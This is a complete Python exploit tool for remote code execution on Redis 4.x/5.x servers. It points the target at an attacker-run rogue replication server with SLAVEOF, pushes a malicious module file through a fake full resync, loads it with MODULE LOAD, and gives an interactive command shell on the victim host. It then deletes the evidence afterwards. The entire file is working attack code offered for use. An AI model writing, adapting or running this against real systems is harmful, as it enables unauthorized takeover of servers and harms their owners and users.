#!/usr/bin/env python
#coding: utf:8
import socket
import os
from time import sleep
import argparse
from six.moves import input

CLRF = "\r\n"
LOGO = R"""
█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   
                                                           
"""
def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd

def mk_cmd(raw_cmd):
    return mk_cmd_arr(raw_cmd.split(" "))

def din(sock, cnt):
    msg = sock.recv(cnt)
    if verbose:
        if len(msg) < 300:
            print("\033[1;34;40m[->]\033[0m {}".format(msg))
        else:
            print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
    return msg.decode()

def dout(sock, msg):
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if verbose:
        if len(msg) < 300:
            print("\033[1;32;40m[<-]\033[0m {}".format(msg))
        else:
            print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))

def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])

class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(mk_cmd(cmd))
        buf = self.recv()
        return buf

    def close(self):
        self._sock.close()

    def shell_cmd(self, cmd):
        self.send(mk_cmd_arr(['system.exec', "{}".format(cmd)]))
        buf = self.recv()
        return buf

class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind((self._host, self._port))
        self._sock.listen(10)

    def handle(self, data):
        resp = ""
        phase = 0
        if data.find("PING") > -1:
            resp = "+PONG" + CLRF
            phase = 1
        elif data.find("REPLCONF") > -1:
            resp = "+OK" + CLRF
            phase = 2
        elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
            resp = "+FULLRESYNC " + "Z"*40 + " 0" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    def close(self):
        self._sock.close()

    def exp(self):
        cli, addr = self._sock.accept()
        back = self._sock.getsockname()
        print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                break

def interact(remote):
    print("\033[92m[+]\033[0m Received backconnect, use exit to exit...")
    try:
        while True:
            cmd = input("$ ")
            cmd = cmd.strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            for l in decode_shell_result(r).split("\n"):
                if l:
                    print(l)
    except KeyboardInterrupt:
        return

def runserver(rhost, rport, lhost, lport):
    print("[*] Listening on {}:{}".format(lhost, lport))
    # expolit
    expfile = os.path.basename(filename)
    remote = Remote(rhost, rport)
    print("[*] Sending SLAVEOF command to server")
    remote.do("SLAVEOF {} {}".format(lhost, lport))
    back = remote._sock.getsockname()
    print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
    print("[*] Setting filename")
    remote.do("CONFIG SET dir /tmp/")
    remote.do("CONFIG SET dbfilename {}".format(expfile))
    remote.do("SAVE")
    sleep(2)
    rogue = RogueServer(lhost, lport)
    print("[*] Tring to run payload")
    rogue.exp()
    sleep(2)
    remote.do("MODULE LOAD /tmp/{}".format(expfile))
    remote.do("SLAVEOF NO ONE")
    print("[*] Closing rogue server...")
    rogue.close()
    # Operations here
    interact(remote)

    # clean up
    print("[*] Clean up..")
    remote.do("CONFIG SET dbfilename dump.rdb")
    remote.shell_cmd("rm /tmp/{}".format(expfile))
    remote.do("MODULE UNLOAD system")
    remote.close()



def main():
    parser = argparse.ArgumentParser(description='Redis 4.x/5.x RCE with RedisModules')
    parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
    parser.add_argument("-p", "--rport", dest="rport", type=int,
                        help="target redis port, default 6379", default=6379)
    parser.add_argument("-L", "--lhost", dest="lhost", type=str,
                        help="rogue server ip", required=True)
    parser.add_argument("-P", "--lport", dest="lport", type=int,
                        help="rogue server listen port, default 21000", default=21000)
    parser.add_argument("-f", "--file", type=str,help="RedisModules to load, default exp.so", default='exp.so')
    parser.add_argument("-v","--verbose", action="store_true", help="show more info", default=False)
    options = parser.parse_args()
    #runserver("127.0.0.1", 6379, "127.0.0.1", 21000)

    print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
    global payload, verbose, filename
    filename = options.file
    verbose = options.verbose
    payload = open(filename, "rb").read()
    runserver(options.rhost, options.rport, options.lhost, options.lport)

if __name__ == '__main__':
    print(LOGO)
    main()